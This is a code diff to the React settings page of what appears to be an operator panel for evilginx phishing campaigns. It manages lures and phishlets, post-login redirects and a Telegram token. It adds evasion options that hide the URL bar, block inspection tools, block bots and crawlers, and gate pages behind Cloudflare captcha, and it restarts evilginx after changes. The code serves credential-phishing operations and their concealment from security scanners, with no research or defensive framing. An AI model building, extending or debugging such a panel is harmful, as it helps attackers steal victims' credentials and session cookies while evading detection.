@@ -2,6 +2,7 @@ import Layout from "@/components/Layout";
 import { useState, useEffect } from "react";
 import { toast } from "react-hot-toast";
 import { Session } from "@/types";
+import useSWR from "swr";
 
 interface Lure {
   hostname: string;
@@ -19,6 +20,10 @@ interface Lure {
   ua_filter: string;
 }
 
+interface LuresResponse {
+  lures: Lure[];
+}
+
 export default function Settings() {
   const [settings, setSettings] = useState({
     telegramToken: "",
@@ -31,6 +36,9 @@ export default function Settings() {
     botRedirectLink: "",
     afterLoginRedirect: "",
     expiryDays: 5,
+    hideUrlBar: true,
+    blockInspect: true,
+    redirectGuard: true,
   });
   const [sessions, setSessions] = useState<Session[]>([]);
   const [loading, setLoading] = useState(false);
@@ -44,6 +52,12 @@ export default function Settings() {
   const [error, setError] = useState<string | null>(null);
   const [lures, setLures] = useState<Lure[]>([]);
   const [selectedLure, setSelectedLure] = useState<Lure | null>(null);
+
+  // Define the fetcher function for SWR
+  const fetcher = (url: string) => fetch(url).then((res) => res.json());
+
+  // Load lures data for dropdown only, no need to track the response in a variable
+  useSWR<LuresResponse>("/api/lures", fetcher);
 
   useEffect(() => {
     const fetchTelegramSettings = async () => {
@@ -148,19 +162,21 @@ export default function Settings() {
                   const lureConfig = await lureConfigResponse.json();
 
                   // Update link data with the lure-specific configuration
-                  linkData.afterLoginRedirect =
-                    lureToSelect.redirect_url || linkData.afterLoginRedirect;
-                  linkData.useCaptcha = lureToSelect.redirector === "main";
+                  if (lureToSelect) {
+                    linkData.afterLoginRedirect =
+                      lureToSelect.redirect_url || linkData.afterLoginRedirect;
+                    linkData.useCaptcha = lureToSelect.redirector === "main";
 
-                  // If we have a path in lureConfig, use it
-                  if (lureConfig.path) {
-                    linkData.linkPath = lureConfig.path;
-                  } else {
-                    // Otherwise use the path from the lure
-                    const cleanPath = lureToSelect.path.startsWith("/")
-                      ? lureToSelect.path.substring(1)
-                      : lureToSelect.path;
-                    linkData.linkPath = cleanPath;
+                    // If we have a path in lureConfig, use it
+                    if (lureConfig.path) {
+                      linkData.linkPath = lureConfig.path;
+                    } else {
+                      // Otherwise use the path from the lure
+                      const cleanPath = lureToSelect.path.startsWith("/")
+                        ? lureToSelect.path.substring(1)
+                        : lureToSelect.path;
+                      linkData.linkPath = cleanPath;
+                    }
                   }
                 }
               } catch (error) {
@@ -324,94 +340,82 @@ export default function Settings() {
     }
   };
 
-  const handleSecuritySubmit = async (e: React.FormEvent) => {
+  const handleCombinedLureSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    try {
-      setSaving(true);
-      const response = await fetch("/api/security-settings", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          blockBots: settings.blockBots,
-          redirectUrl: settings.botRedirectLink,
-        }),
-      });
+    if (!selectedLure) return;
 
-      if (!response.ok) {
-        throw new Error("Failed to update security settings");
-      }
-
-      // Restart evilginx after updating security settings
-      await fetch("/api/restart-evilginx", {
-        method: "POST",
-      });
-
-      setShowSuccess(true);
-      setTimeout(() => setShowSuccess(false), 3000);
-
-      toast.success("Security settings updated successfully");
-    } catch (error) {
-      console.error("Error updating security settings:", error);
-      toast.error("Failed to update security settings");
-    } finally {
-      setSaving(false);
-    }
-  };
-
-  const handleLinkSettingsSubmit = async (e: React.FormEvent) => {
-    e.preventDefault();
     try {
       setSaving(true);
 
-      // Prepare the request body
-      const requestBody = {
-        afterLoginRedirect: settings.afterLoginRedirect,
-        useCaptcha: settings.useCaptcha,
-        linkPath: settings.linkPath,
+      // Security settings request
+      const securityRequestBody = {
+        hideUrlBar: settings.hideUrlBar,
+        blockInspect: settings.blockInspect,
+        redirectGuard: settings.redirectGuard,
       };
 
       // If we have a selected lure, include its ID
-      if (selectedLure) {
-        // @ts-ignore - Add lureId to the request if we have a selected lure
-        requestBody.lureId = selectedLure.id;
-      }
-
-      const response = await fetch("/api/link-settings", {
+      const securityResponse = await fetch("/api/security-settings", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(requestBody),
+        body: JSON.stringify(securityRequestBody),
       });
 
-      if (!response.ok) {
+      if (!securityResponse.ok) {
+        throw new Error("Failed to update security settings");
+      }
+
+      // Link settings request
+      const linkRequestBody = {
+        afterLoginRedirect: settings.afterLoginRedirect,
+        useCaptcha: settings.useCaptcha,
+        linkPath: settings.linkPath,
+        lureId: selectedLure.id,
+      };
+
+      const linkResponse = await fetch("/api/link-settings", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(linkRequestBody),
+      });
+
+      if (!linkResponse.ok) {
         throw new Error("Failed to update link settings");
       }
 
-      // Restart evilginx after updating link settings
+      // Restart evilginx after updating settings
       await fetch("/api/restart-evilginx", {
         method: "POST",
       });
 
-      // Update the localStorage with the selected lure ID if applicable
-      if (selectedLure) {
-        localStorage.setItem("selectedLureId", selectedLure.id);
-      }
+      // Update the localStorage with the selected lure ID
+      localStorage.setItem("selectedLureId", selectedLure.id);
 
-      // Emit a custom event that the index page can listen to
-      const event = new CustomEvent("linkSettingsUpdated", {
+      // Emit custom events
+      const securityEvent = new CustomEvent("securitySettingsUpdated", {
         detail: {
-          lureId: selectedLure?.id,
-          settings: requestBody,
+          lureId: selectedLure.id,
+          settings: securityRequestBody,
         },
       });
-      window.dispatchEvent(event);
+      window.dispatchEvent(securityEvent);
+
+      const linkEvent = new CustomEvent("linkSettingsUpdated", {
+        detail: {
+          lureId: selectedLure.id,
+          settings: linkRequestBody,
+        },
+      });
+      window.dispatchEvent(linkEvent);
 
       setShowSuccess(true);
       setTimeout(() => setShowSuccess(false), 3000);
 
-      toast.success("Link settings updated successfully");
+      // Single success toast for both updates
+      toast.success("Lure settings updated successfully");
     } catch (error) {
-      console.error("Error updating link settings:", error);
-      toast.error("Failed to update link settings");
+      console.error("Error updating lure settings:", error);
+      toast.error("Failed to update lure settings");
     } finally {
       setSaving(false);
     }
@@ -663,166 +667,190 @@ export default function Settings() {
           </form>
         </section>
 
-        <section className="bg-[#232A34] rounded-lg p-6">
-          <h2 className="text-white text-xl mb-4">
-            Link Configuration{" "}
-            {selectedLure && `(Currently editing: ${selectedLure.phishlet})`}
-          </h2>
-          <form
-            onSubmit={(e) => {
-              e.preventDefault();
-              // Call both handlers with the same event
-              handleSecuritySubmit(e);
-              handleLinkSettingsSubmit(e);
-            }}
-            className="space-y-6"
-          >
-            {/* Link Path and Lure Selection */}
-            <div>
-              <label className="block text-gray-400 mb-2">Link Path</label>
-              <input
-                type="text"
-                data-allow-select="true"
-                className="w-full bg-[#1B2028] text-white p-3 rounded"
-                value={settings.linkPath}
-                onChange={(e) =>
-                  setSettings({
-                    ...settings,
-                    linkPath: e.target.value.replace(/^\/+/, ""),
-                  })
-                }
-                placeholder="Enter path (without leading /)"
-              />
-              <p className="text-xs text-gray-500 mt-1">
-                The path will always start with "/" in the system
-              </p>
-              {selectedLure && (
-                <p className="text-xs text-indigo-400 mt-1">
-                  Currently editing: {selectedLure.phishlet} -{" "}
-                  {selectedLure.path}
-                </p>
-              )}
-            </div>
-
-            {/* Redirect Settings */}
-            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
-              <div>
-                <label className="block text-gray-400 mb-2">
-                  After Login Redirect URL
-                </label>
-                <input
-                  type="text"
-                  data-allow-select="true"
-                  className="w-full bg-[#1B2028] text-white p-3 rounded"
-                  value={settings.afterLoginRedirect}
-                  onChange={(e) =>
-                    setSettings({
-                      ...settings,
-                      afterLoginRedirect: e.target.value,
-                    })
-                  }
-                  placeholder="https://example.com"
-                />
-              </div>
-
-              <div>
-                <label className="block text-gray-400 mb-2">
-                  Redirect URL for Blocked IPs
-                </label>
-                <input
-                  type="text"
-                  data-allow-select="true"
-                  className="w-full bg-[#1B2028] text-white p-3 rounded"
-                  value={settings.botRedirectLink}
-                  onChange={(e) =>
-                    setSettings({
-                      ...settings,
-                      botRedirectLink: e.target.value,
-                    })
-                  }
-                  placeholder="https://example.com"
-                />
-              </div>
-            </div>
-
-            {/* Security and Captcha Settings */}
-            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
-              <div>
-                <h3 className="text-gray-400 mb-3">Bot Protection</h3>
-                <div className="space-y-2">
-                  <label className="flex items-center space-x-2">
-                    <input
-                      type="radio"
-                      data-allow-select="true"
-                      checked={settings.blockBots}
-                      onChange={() =>
-                        setSettings({ ...settings, blockBots: true })
-                      }
-                      className="text-indigo-500"
-                    />
-                    <span className="text-gray-400">
-                      Block All Bots And Crawlers
-                    </span>
+        {/* Dynamic Lure Configuration Sections - Generate one section per lure */}
+        {lures.length > 0 ? (
+          lures.map((lure) => (
+            <section key={lure.id} className="bg-[#232A34] rounded-lg p-6">
+              <h2 className="text-white text-xl mb-4">
+                Link Configuration (Currently editing: {lure.phishlet})
+              </h2>
+              <form
+                onSubmit={(e) => {
+                  // Set the selected lure before submitting
+                  setSelectedLure(lure);
+                  handleCombinedLureSubmit(e);
+                }}
+                className="space-y-6"
+              >
+                {/* Link Path - Pre-filled with this lure's path */}
+                <div>
+                  <label className="block text-gray-400 mb-2">
+                    Link Path for {lure.phishlet}
                   </label>
-                  <label className="flex items-center space-x-2">
-                    <input
-                      type="radio"
-                      data-allow-select="true"
-                      checked={!settings.blockBots}
-                      onChange={() =>
-                        setSettings({ ...settings, blockBots: false })
-                      }
-                      className="text-indigo-500"
-                    />
-                    <span className="text-gray-400">Do Not Block Bots</span>
-                  </label>
+                  <input
+                    type="text"
+                    data-allow-select="true"
+                    className="w-full bg-[#1B2028] text-white p-3 rounded"
+                    defaultValue={
+                      lure.path.startsWith("/")
+                        ? lure.path.substring(1)
+                        : lure.path
+                    }
+                    readOnly
+                    placeholder="Enter path (without leading /)"
+                  />
+                  <p className="text-xs text-gray-500 mt-1">
+                    The path will always start with &quot;/&quot; in the system
+                  </p>
                 </div>
-              </div>
 
-              <div>
-                <h3 className="text-gray-400 mb-3">Captcha Settings</h3>
-                <div className="space-y-2">
-                  <label className="flex items-center space-x-2">
+                {/* Redirect Settings */}
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+                  <div>
+                    <label className="block text-gray-400 mb-2">
+                      After Login Redirect URL
+                    </label>
                     <input
-                      type="radio"
+                      type="text"
                       data-allow-select="true"
-                      checked={settings.useCaptcha}
-                      onChange={() =>
-                        setSettings({ ...settings, useCaptcha: true })
+                      className="w-full bg-[#1B2028] text-white p-3 rounded"
+                      defaultValue={
+                        lure.redirect_url || settings.afterLoginRedirect
                       }
-                      className="text-indigo-500"
+                      onChange={(e) => {
+                        // Update the redirect URL for this specific lure
+                        const updatedLures = lures.map((l) =>
+                          l.id === lure.id
+                            ? { ...l, redirect_url: e.target.value }
+                            : l
+                        );
+                        setLures(updatedLures);
+                      }}
+                      placeholder="https://example.com"
                     />
-                    <span className="text-gray-400">
-                      Use Cloudflare Captcha
-                    </span>
-                  </label>
-                  <label className="flex items-center space-x-2">
+                  </div>
+
+                  <div>
+                    <label className="block text-gray-400 mb-2">
+                      Redirect URL for Blocked IPs
+                    </label>
                     <input
-                      type="radio"
+                      type="text"
                       data-allow-select="true"
-                      checked={!settings.useCaptcha}
-                      onChange={() =>
-                        setSettings({ ...settings, useCaptcha: false })
+                      className="w-full bg-[#1B2028] text-white p-3 rounded"
+                      value={settings.botRedirectLink}
+                      onChange={(e) =>
+                        setSettings({
+                          ...settings,
+                          botRedirectLink: e.target.value,
+                        })
                       }
-                      className="text-indigo-500"
+                      placeholder="https://example.com"
                     />
-                    <span className="text-gray-400">Do Not Use Captcha</span>
-                  </label>
+                  </div>
                 </div>
-              </div>
-            </div>
 
-            <button
-              type="submit"
-              disabled={saving}
-              className={`bg-indigo-500 text-white px-6 py-2 rounded ${
-                saving ? "opacity-50 cursor-not-allowed" : "hover:bg-indigo-600"
-              } transition-colors`}
-            >
-              {saving ? "Saving..." : "Save Link Configuration"}
-            </button>
-          </form>
-        </section>
+                {/* Security and Captcha Settings */}
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+                  <div>
+                    <h3 className="text-gray-400 mb-3">Bot Protection</h3>
+                    <div className="space-y-2">
+                      <label className="flex items-center space-x-2">
+                        <input
+                          type="radio"
+                          data-allow-select="true"
+                          checked={settings.blockBots}
+                          onChange={() =>
+                            setSettings({ ...settings, blockBots: true })
+                          }
+                          className="text-indigo-500"
+                        />
+                        <span className="text-gray-400">
+                          Block All Bots And Crawlers
+                        </span>
+                      </label>
+                      <label className="flex items-center space-x-2">
+                        <input
+                          type="radio"
+                          data-allow-select="true"
+                          checked={!settings.blockBots}
+                          onChange={() =>
+                            setSettings({ ...settings, blockBots: false })
+                          }
+                          className="text-indigo-500"
+                        />
+                        <span className="text-gray-400">Do Not Block Bots</span>
+                      </label>
+                    </div>
+                  </div>
+
+                  <div>
+                    <h3 className="text-gray-400 mb-3">Captcha Settings</h3>
+                    <div className="space-y-2">
+                      <label className="flex items-center space-x-2">
+                        <input
+                          type="radio"
+                          data-allow-select="true"
+                          checked={lure.redirector === "main"}
+                          onChange={() => {
+                            // Update the redirector for this specific lure
+                            const updatedLures = lures.map((l) =>
+                              l.id === lure.id
+                                ? { ...l, redirector: "main" }
+                                : l
+                            );
+                            setLures(updatedLures);
+                          }}
+                          className="text-indigo-500"
+                        />
+                        <span className="text-gray-400">
+                          Use Cloudflare Captcha
+                        </span>
+                      </label>
+                      <label className="flex items-center space-x-2">
+                        <input
+                          type="radio"
+                          data-allow-select="true"
+                          checked={lure.redirector !== "main"}
+                          onChange={() => {
+                            // Update the redirector for this specific lure
+                            const updatedLures = lures.map((l) =>
+                              l.id === lure.id ? { ...l, redirector: "" } : l
+                            );
+                            setLures(updatedLures);
+                          }}
+                          className="text-indigo-500"
+                        />
+                        <span className="text-gray-400">
+                          Do Not Use Captcha
+                        </span>
+                      </label>
+                    </div>
+                  </div>
+                </div>
+
+                <button
+                  type="submit"
+                  disabled={saving}
+                  className={`bg-indigo-500 text-white px-6 py-2 rounded ${
+                    saving
+                      ? "opacity-50 cursor-not-allowed"
+                      : "hover:bg-indigo-600"
+                  } transition-colors`}
+                >
+                  {saving ? "Saving..." : `Save ${lure.phishlet} Configuration`}
+                </button>
+              </form>
+            </section>
+          ))
+        ) : (
+          <div className="bg-[#232A34] rounded-lg p-6">
+            <h2 className="text-white text-xl mb-4">Link Configuration</h2>
+            <p className="text-gray-400">
+              No lures available. Please create lures in evilginx first.
+            </p>
+          </div>
+        )}
 
         <section className="bg-[#232A34] rounded-lg p-6">
           <h2 className="text-white text-xl mb-4">Blacklist Management</h2>
